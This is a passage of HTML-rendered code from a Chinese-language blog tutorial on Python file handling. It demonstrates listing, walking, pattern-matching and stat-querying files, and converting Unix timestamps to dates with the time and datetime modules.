string">'.deploy_git'</span><span class="token punctuation">,</span> <span class="token string">'.gitignore'</span><span class="token punctuation">,</span> <span class="token string">'.vscode'</span><span class="token punctuation">,</span> <span class="token string">'db.json'</span><span class="token punctuation">,</span> <span class="token string">'node_modules'</span><span class="token punctuation">,</span> <span class="token string">'package-lock.json'</span><span class="token punctuation">,</span> <span class="token string">'package.json'</span><span class="token punctuation">,</span> <span class="token string">'public'</span><span class="token punctuation">,</span> <span class="token string">'scaffolds'</span><span class="token punctuation">,</span> <span class="token string">'source'</span><span class="token punctuation">,</span> <span class="token string">'themes'</span><span class="token punctuation">,</span> <span class="token string">'_config.yml'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也可以指定绝对路径或相对路径</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'.vscode'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'settings.json'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>判断谁是文件谁是文件夹</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> item <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">.</span>deploy_git <span class="token boolean">True</span><span class="token punctuation">.</span>gitignore <span class="token boolean">False</span><span class="token punctuation">.</span>vscode <span class="token boolean">True</span>db<span class="token punctuation">.</span>json <span class="token boolean">False</span>node_modules <span class="token boolean">True</span>package<span class="token operator">-</span>lock<span class="token punctuation">.</span>json <span class="token boolean">False</span>package<span class="token punctuation">.</span>json <span class="token boolean">False</span>public <span class="token boolean">True</span>scaffolds <span class="token boolean">True</span>source <span class="token boolean">True</span>themes <span class="token boolean">True</span>_config<span class="token punctuation">.</span>yml <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者更加简便的方法</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> os<span class="token punctuation">.</span>scandir<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span><span class="token builtin">file</span><span class="token punctuation">.</span>is_dir<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">.</span>deploy_git <span class="token boolean">True</span><span class="token punctuation">.</span>gitignore <span class="token boolean">False</span><span class="token punctuation">.</span>vscode <span class="token boolean">True</span>db<span class="token punctuation">.</span>json <span class="token boolean">False</span>node_modules <span class="token boolean">True</span>package<span class="token operator">-</span>lock<span class="token punctuation">.</span>json <span class="token boolean">False</span>package<span class="token punctuation">.</span>json <span class="token boolean">False</span>public <span class="token boolean">True</span>scaffolds <span class="token boolean">True</span>source <span class="token boolean">True</span>themes <span class="token boolean">True</span>_config<span class="token punctuation">.</span>yml <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="遍历文件夹"><a href="#遍历文件夹" class="headerlink" title="遍历文件夹"></a>遍历文件夹</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> dirpath<span class="token punctuation">,</span>dirnames<span class="token punctuation">,</span>files <span class="token keyword">in</span> os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span><span class="token string">'./source'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'发现文件夹</span><span class="token interpolation"><span class="token punctuation">&#123;</span>dirpath<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>files<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 发现文件夹<span class="token punctuation">.</span><span class="token operator">/</span>source<span class="token punctuation">[</span><span class="token string">'CNAME'</span><span class="token punctuation">]</span>发现文件夹<span class="token punctuation">.</span><span class="token operator">/</span>source\categories<span class="token punctuation">[</span><span class="token string">'index.md'</span><span class="token punctuation">]</span>发现文件夹<span class="token punctuation">.</span><span class="token operator">/</span>source\tags<span class="token punctuation">[</span><span class="token string">'index.md'</span><span class="token punctuation">]</span>发现文件夹<span class="token punctuation">.</span><span class="token operator">/</span>source\whoami<span class="token punctuation">[</span><span class="token string">'index.md'</span><span class="token punctuation">]</span>发现文件夹<span class="token punctuation">.</span><span class="token operator">/</span>source\_posts<span class="token punctuation">[</span><span class="token string">'2020-02-28-CA_notes_L1.md'</span><span class="token punctuation">,</span> <span class="token string">'2020-02-28-CN_notes_L1.md'</span><span class="token punctuation">,</span> <span class="token string">'2020-02-28-Hello.md'</span><span class="token punctuation">,</span> <span class="token string">'2020-03-01-CTFHub-writeUp-01.md'</span><span class="token punctuation">,</span> <span class="token string">'2020-03-09-CA-notes-L4-1.md'</span><span class="token punctuation">,</span> <span class="token string">'2020-03-10-CN_notes_L2.md'</span><span class="token punctuation">,</span> <span class="token string">'2020-03-11-OS(Tsinghua)_notes_L1.md'</span><span class="token punctuation">,</span> <span class="token string">'2020-03-15-mysql-injection-1.md'</span><span class="token punctuation">,</span> <span class="token string">'2020-03-16-love.md'</span><span class="token punctuation">,</span> <span class="token string">'2020-03-16-mysql-injection-2.md'</span><span class="token punctuation">,</span> <span class="token string">'2020-03-17-sqlmap.md'</span><span class="token punctuation">,</span> <span class="token string">'2020-03-19-CN_notes_L3.md'</span><span class="token punctuation">,</span> <span class="token string">'BJDCTF记录.md'</span><span class="token punctuation">,</span> <span class="token string">'CA-notes-L4-2.md'</span><span class="token punctuation">,</span> <span class="token string">'CA-notes-L4.md'</span><span class="token punctuation">,</span> <span class="token string">'CN-notes-L4.md'</span><span class="token punctuation">,</span> <span class="token string">'CN-notes-L5.md'</span><span class="token punctuation">,</span> <span class="token string">'computer-network-quiz-integration.md'</span><span class="token punctuation">,</span> <span class="token string">'Database-homework.md'</span><span class="token punctuation">,</span> <span class="token string">'Python-自动化.md'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>dirpath-&gt;文件夹路径，dirnames-&gt;dirpath这个文件夹下的子文件夹列表，files-&gt;dirpath这个文件夹里的文件列表</p><h3 id="搜索、匹配文件名称"><a href="#搜索、匹配文件名称" class="headerlink" title="搜索、匹配文件名称"></a>搜索、匹配文件名称</h3><h4 id="字符串内置方法"><a href="#字符串内置方法" class="headerlink" title="字符串内置方法"></a>字符串内置方法</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'abc.txt'</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'ab'</span><span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'abc.txt'</span><span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'xt'</span><span class="token punctuation">)</span>   <span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="使用glob模块"><a href="#使用glob模块" class="headerlink" title="使用glob模块"></a>使用glob模块</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> glob<span class="token operator">>></span><span class="token operator">></span> glob<span class="token punctuation">.</span>glob<span class="token punctuation">(</span><span class="token string">'*.json'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'db.json'</span><span class="token punctuation">,</span> <span class="token string">'package-lock.json'</span><span class="token punctuation">,</span> <span class="token string">'package.json'</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> glob<span class="token punctuation">.</span>glob<span class="token punctuation">(</span><span class="token string">'pack*.json'</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token string">'package-lock.json'</span><span class="token punctuation">,</span> <span class="token string">'package.json'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th align="center">模式</th><th align="center">意义</th></tr></thead><tbody><tr><td align="center">*</td><td align="center">匹配所有</td></tr><tr><td align="center">?</td><td align="center">匹配任意单个字符</td></tr><tr><td align="center">[seq]</td><td align="center">匹配seq中的任何字符</td></tr><tr><td align="center">[!seq]</td><td align="center">匹配任何不再seq中的字符</td></tr></tbody></table><p>递归查找<br>使用**代表任意层文件或文件夹，recursive=True会不断进入文件夹内</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> glob<span class="token punctuation">.</span>glob<span class="token punctuation">(</span><span class="token string">'**/*.md'</span><span class="token punctuation">,</span>recursive<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'categories\\index.md'</span><span class="token punctuation">,</span> <span class="token string">'tags\\index.md'</span><span class="token punctuation">,</span> <span class="token string">'whoami\\index.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\2020-02-28-CA_notes_L1.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\2020-02-28-CN_notes_L1.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\2020-02-28-Hello.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\2020-03-01-CTFHub-writeUp-01.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\2020-03-09-CA-notes-L4-1.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\2020-03-10-CN_notes_L2.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\2020-03-11-OS(Tsinghua)_notes_L1.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\2020-03-15-mysql-injection-1.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\2020-03-16-love.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\2020-03-16-mysql-injection-2.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\2020-03-17-sqlmap.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\2020-03-19-CN_notes_L3.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\BJDCTF记录.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\CA-notes-L4-2.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\CA-notes-L4.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\CN-notes-L4.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\CN-notes-L5.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\computer-network-quiz-integration.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\Database-homework.md'</span><span class="token punctuation">,</span> <span class="token string">'_posts\\Python-自动化.md'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="使用fnmatch"><a href="#使用fnmatch" class="headerlink" title="使用fnmatch"></a>使用fnmatch</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> fnmatch<span class="token operator">>></span><span class="token operator">></span> fnmatch<span class="token punctuation">.</span>fnmatch<span class="token punctuation">(</span><span class="token string">'abc.txt'</span><span class="token punctuation">,</span><span class="token string">'ab*'</span><span class="token punctuation">)</span><span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="查询文件信息"><a href="#查询文件信息" class="headerlink" title="查询文件信息"></a>查询文件信息</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> os<span class="token punctuation">.</span>scandir<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>stat<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> os<span class="token punctuation">.</span>stat_result<span class="token punctuation">(</span>st_mode<span class="token operator">=</span><span class="token number">16895</span><span class="token punctuation">,</span> st_ino<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_dev<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_nlink<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_gid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_atime<span class="token operator">=</span><span class="token number">1587385005</span><span class="token punctuation">,</span> st_mtime<span class="token operator">=</span><span class="token number">1587222955</span><span class="token punctuation">,</span> st_ctime<span class="token operator">=</span><span class="token number">1584782843</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>stat_result<span class="token punctuation">(</span>st_mode<span class="token operator">=</span><span class="token number">33206</span><span class="token punctuation">,</span> st_ino<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_dev<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_nlink<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_gid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_size<span class="token operator">=</span><span class="token number">71</span><span class="token punctuation">,</span> st_atime<span class="token operator">=</span><span class="token number">1587385016</span><span class="token punctuation">,</span> st_mtime<span class="token operator">=</span><span class="token number">1584779579</span><span class="token punctuation">,</span> st_ctime<span class="token operator">=</span><span class="token number">1584779579</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>stat_result<span class="token punctuation">(</span>st_mode<span class="token operator">=</span><span class="token number">16895</span><span class="token punctuation">,</span> st_ino<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_dev<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_nlink<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_gid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_atime<span class="token operator">=</span><span class="token number">1587385004</span><span class="token punctuation">,</span> st_mtime<span class="token operator">=</span><span class="token number">1584872350</span><span class="token punctuation">,</span> st_ctime<span class="token operator">=</span><span class="token number">1584872350</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>stat_result<span class="token punctuation">(</span>st_mode<span class="token operator">=</span><span class="token number">33206</span><span class="token punctuation">,</span> st_ino<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_dev<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_nlink<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_gid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_size<span class="token operator">=</span><span class="token number">455961</span><span class="token punctuation">,</span> st_atime<span class="token operator">=</span><span class="token number">1587222951</span><span class="token punctuation">,</span> st_mtime<span class="token operator">=</span><span class="token number">1587222951</span><span class="token punctuation">,</span> st_ctime<span class="token operator">=</span><span class="token number">1587221906</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>stat_result<span class="token punctuation">(</span>st_mode<span class="token operator">=</span><span class="token number">16895</span><span class="token punctuation">,</span> st_ino<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_dev<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_nlink<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_gid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_atime<span class="token operator">=</span><span class="token number">1587385005</span><span class="token punctuation">,</span> st_mtime<span class="token operator">=</span><span class="token number">1584868409</span><span class="token punctuation">,</span> st_ctime<span class="token operator">=</span><span class="token number">1584779967</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>stat_result<span class="token punctuation">(</span>st_mode<span class="token operator">=</span><span class="token number">33206</span><span class="token punctuation">,</span> st_ino<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_dev<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_nlink<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_gid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_size<span class="token operator">=</span><span class="token number">78939</span><span class="token punctuation">,</span> st_atime<span class="token operator">=</span><span class="token number">1584930528</span><span class="token punctuation">,</span> st_mtime<span class="token operator">=</span><span class="token number">1584868409</span><span class="token punctuation">,</span> st_ctime<span class="token operator">=</span><span class="token number">1584868409</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>stat_result<span class="token punctuation">(</span>st_mode<span class="token operator">=</span><span class="token number">33206</span><span class="token punctuation">,</span> st_ino<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_dev<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_nlink<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_gid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_size<span class="token operator">=</span><span class="token number">1052</span><span class="token punctuation">,</span> st_atime<span class="token operator">=</span><span class="token number">1587385005</span><span class="token punctuation">,</span> st_mtime<span class="token operator">=</span><span class="token number">1584868409</span><span class="token punctuation">,</span> st_ctime<span class="token operator">=</span><span class="token number">1584868409</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>stat_result<span class="token punctuation">(</span>st_mode<span class="token operator">=</span><span class="token number">16895</span><span class="token punctuation">,</span> st_ino<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_dev<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_nlink<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_gid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_atime<span class="token operator">=</span><span class="token number">1587385005</span><span class="token punctuation">,</span> st_mtime<span class="token operator">=</span><span class="token number">1587221906</span><span class="token punctuation">,</span> st_ctime<span class="token operator">=</span><span class="token number">1587221904</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>stat_result<span class="token punctuation">(</span>st_mode<span class="token operator">=</span><span class="token number">16895</span><span class="token punctuation">,</span> st_ino<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_dev<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_nlink<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_gid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_atime<span class="token operator">=</span><span class="token number">1587385002</span><span class="token punctuation">,</span> st_mtime<span class="token operator">=</span><span class="token number">1584779579</span><span class="token punctuation">,</span> st_ctime<span class="token operator">=</span><span class="token number">1584779579</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>stat_result<span class="token punctuation">(</span>st_mode<span class="token operator">=</span><span class="token number">16895</span><span class="token punctuation">,</span> st_ino<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_dev<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_nlink<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_gid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_atime<span class="token operator">=</span><span class="token number">1587385002</span><span class="token punctuation">,</span> st_mtime<span class="token operator">=</span><span class="token number">1584930910</span><span class="token punctuation">,</span> st_ctime<span class="token operator">=</span><span class="token number">1584779579</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>stat_result<span class="token punctuation">(</span>st_mode<span class="token operator">=</span><span class="token number">16895</span><span class="token punctuation">,</span> st_ino<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_dev<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_nlink<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_gid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_atime<span class="token operator">=</span><span class="token number">1587385002</span><span class="token punctuation">,</span> st_mtime<span class="token operator">=</span><span class="token number">1584868229</span><span class="token punctuation">,</span> st_ctime<span class="token operator">=</span><span class="token number">1584779579</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>stat_result<span class="token punctuation">(</span>st_mode<span class="token operator">=</span><span class="token number">33206</span><span class="token punctuation">,</span> st_ino<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_dev<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_nlink<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_gid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_size<span class="token operator">=</span><span class="token number">2627</span><span class="token punctuation">,</span> st_atime<span class="token operator">=</span><span class="token number">1587385020</span><span class="token punctuation">,</span> st_mtime<span class="token operator">=</span><span class="token number">1584870887</span><span class="token punctuation">,</span> st_ctime<span class="token operator">=</span><span class="token number">1584779579</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>st_size:文件的体积大小(bytes)，除以1024就是KB  </li><li>st_atime:文件的最近访问时间</li><li>st_mtime:文件的最近修改时间</li><li>st_ctime:Windows下表示创建时间</li><li>st_birthtime:只在Mac,Linux下可用，表示创建时间</li></ul><p>上面的时间都是类似1584868409这样的数字，这种时间叫做Unix时间戳，可以利用Python转换为正常日期时间</p><h4 id="time模块"><a href="#time模块" class="headerlink" title="time模块"></a>time模块</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> time<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> os<span class="token punctuation">.</span>scandir<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span>time<span class="token punctuation">.</span>ctime<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>stat<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>st_mtime<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">.</span>deploy_git Sat Apr <span class="token number">18</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token number">55</span> <span class="token number">2020</span><span class="token punctuation">.</span>gitignore Sat Mar <span class="token number">21</span> <span class="token number">16</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token number">59</span> <span class="token number">2020</span><span class="token punctuation">.</span>vscode Sun Mar <span class="token number">22</span> <span class="token number">18</span><span class="token punctuation">:</span><span class="token number">19</span><span class="token punctuation">:</span><span class="token number">10</span> <span class="token number">2020</span>db<span class="token punctuation">.</span>json Sat Apr <span class="token number">18</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token number">51</span> <span class="token number">2020</span>node_modules Sun Mar <span class="token number">22</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token number">29</span> <span class="token number">2020</span>package<span class="token operator">-</span>lock<span class="token punctuation">.</span>json Sun Mar <span class="token number">22</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token number">29</span> <span class="token number">2020</span>package<span class="token punctuation">.</span>json Sun Mar <span class="token number">22</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token number">29</span> <span class="token number">2020</span>public Sat Apr <span class="token number">18</span> <span class="token number">22</span><span class="token punctuation">:</span><span class="token number">58</span><span class="token punctuation">:</span><span class="token number">26</span> <span class="token number">2020</span>scaffolds Sat Mar <span class="token number">21</span> <span class="token number">16</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token number">59</span> <span class="token number">2020</span>source Mon Mar <span class="token number">23</span> <span class="token number">10</span><span class="token punctuation">:</span><span class="token number">35</span><span class="token punctuation">:</span><span class="token number">10</span> <span class="token number">2020</span>themes Sun Mar <span class="token number">22</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token number">29</span> <span class="token number">2020</span>_config<span class="token punctuation">.</span>yml Sun Mar <span class="token number">22</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">54</span><span class="token punctuation">:</span><span class="token number">47</span> <span class="token number">2020</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="datetime模块"><a href="#datetime模块" class="headerlink" title="datetime模块"></a>datetime模块</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> datetime<span class="token operator">>></span><span class="token operator">></span> a<span class="token operator">=</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>fromtimestamp<span class="token punctuation">(</span><span class="token number">1584868409</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token number">2020</span><span class="token operator">-</span><span class="token number">03</span><span class="token operator">-</span><span class="token number">22</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token number">29</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>hour<span class="token punctuation">,</span>a<span class="token punctuation">.</span>minute<span class="token punctuation">,</span>a<span class="token punctuation">.</span>second<span class="token punctuation">,</span>a<span class="token punctuation">.</span>year<span class="token punctuation">,</span>a<span class="token punctuation">.</span>month<span class="token punctuation">,</span>a<span class="token punctuation">.</span>day<span class="token punctuation">)</span> <span class="token number">17</span> <span class="token number">13</span> <span class="token number">29</span> <span class="token number">2020</span> <span class="token number">3</span> <span class="token number">22</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="写入，读取文件"><a href="#写入，读取文件" class="headerlink" title="写入，读取文件"></a>写入，读取文件</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span 